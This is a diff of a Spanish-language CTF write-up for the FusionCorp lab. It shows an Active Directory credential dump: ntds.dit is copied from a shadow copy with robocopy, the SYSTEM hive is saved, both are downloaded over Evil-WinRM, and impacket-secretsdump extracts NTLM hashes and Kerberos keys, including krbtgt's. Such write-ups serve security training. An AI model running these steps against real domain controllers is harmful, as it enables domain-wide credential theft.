@@ -515,28 +515,79 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
             -> end backup
             -> exit
 
-        3) La copia se ha creado correctamente y en estos momentos tenemos el fichero ntds.dit en x:\windows\ntds\ntds.dit
+        3)La copia se ha creado correctamente y en estos momentos tenemos el fichero ntds.dit en x:\windows\ntds\ntds.dit
 
-           -Copiamos dicho fichero de x:\windows\ntds\ntds.dit --> C:\temp
+          -Copiamos dicho fichero de x:\windows\ntds\ntds.dit --> C:\temp
            
-                *Evil-WinRM* PS x:\windows\ntds> robocopy /B .\ c:\temp ntds.dit
-                
-                -------------------------------------------------------------------------------
-                   ROBOCOPY     ::     Robust File Copy for Windows
-                -------------------------------------------------------------------------------
-                
-                  Started : Sunday, October 15, 2023 12:38:08 AM
-                   Source : x:\windows\ntds\
-                     Dest : c:\temp\
-                
-                    Files : ntds.dit
-                
-                  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+                  *Evil-WinRM* PS x:\windows\ntds> robocopy /B .\ c:\temp ntds.dit
+                  
+                  -------------------------------------------------------------------------------
+                     ROBOCOPY     ::     Robust File Copy for Windows
+                  -------------------------------------------------------------------------------
+                    Started : Sunday, October 15, 2023 12:38:08 AM
+                     Source : x:\windows\ntds\
+                       Dest : c:\temp\
+                      Files : ntds.dit
+                    Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
 
-            -Extraemos del registro de windows una copia de SYSTEM, lo vamos a necesitar.
+          -Extraemos del registro de windows una copia de SYSTEM, lo vamos a necesitar.
 
-                *Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM SYSTEM
-                The operation completed successfully.
+                  *Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM SYSTEM
+                  The operation completed successfully.
+
+        4)Obtenemos hashes de usuarios
+
+          -Descargamos ntds.dit y SYSTEM a nuestra maquina.
+
+            *Evil-WinRM* PS C:\temp> download ntds.dit ./content/ntds.dit
+                                                    
+            Info: Downloading C:\temp\ntds.dit to ./content/ntds.dit                          
+            Info: Download successful!
+
+
+            *Evil-WinRM* PS C:\temp> download SYSTEM ./content/SYSTEM
+                                                    
+            Info: Downloading C:\temp\SYSTEM to ./content/SYSTEM
+            Info: Download successful!
+        
+          -Obtenemos hashes de ntds.dit
+        
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/FusionCorp/content]
+            └─# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+            Impacket v0.11.0 - Copyright 2023 Fortra
+            
+            [*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
+            [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+            [*] Searching for pekList, be patient
+            [*] PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
+            [*] Reading and decrypting hashes from ntds.dit 
+            Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
+            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+            FUSION-DC$:1000:aad3b435b51404eeaad3b435b51404ee:84c7f6b901db6d20745ae3a344c8213b:::
+            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:feabe44b40ad2341cdef1fd95297ef38:::
+            fusion.corp\lparker:1103:aad3b435b51404eeaad3b435b51404ee:5a2ed7b4bb2cd206cc884319b97b6ce8:::
+            fusion.corp\jmurphy:1104:aad3b435b51404eeaad3b435b51404ee:69c62e471cf61441bb80c5af410a17a3:::
+            [*] Kerberos keys from ntds.dit 
+            Administrator:aes256-cts-hmac-sha1-96:4db79e601e451bea7bb01d0a8a1b5d2950992b3d2e3e750ab1f3c93f2110a2e1
+            Administrator:aes128-cts-hmac-sha1-96:c0006e6cbd625c775cb9971c711d6ea8
+            Administrator:des-cbc-md5:d64f8c131997a42a
+            FUSION-DC$:aes256-cts-hmac-sha1-96:75de4118e0ed29158863f64269191cde978551ca1f80c6f26ccdc04995c3b0ef
+            FUSION-DC$:aes128-cts-hmac-sha1-96:5502eacc44d0e752dc40b0e3d9ac4a7c
+            FUSION-DC$:des-cbc-md5:164f73802ce5677f
+            krbtgt:aes256-cts-hmac-sha1-96:82e655601984d4d9d3fee50c9809c3a953a584a5949c6e82e5626340df2371ad
+            krbtgt:aes128-cts-hmac-sha1-96:63bf9a2734e81f83ed6ccb1a8982882c
+            krbtgt:des-cbc-md5:167a91b383cb104a
+            fusion.corp\lparker:aes256-cts-hmac-sha1-96:4c3daa8ed0c9f262289be9af7e35aeefe0f1e63458685c0130ef551b9a45e19a
+            fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
+            fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
+            fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
+            fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
+            fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
+            [*] Cleaning up... 
+
+
+        
+            
 
 
           
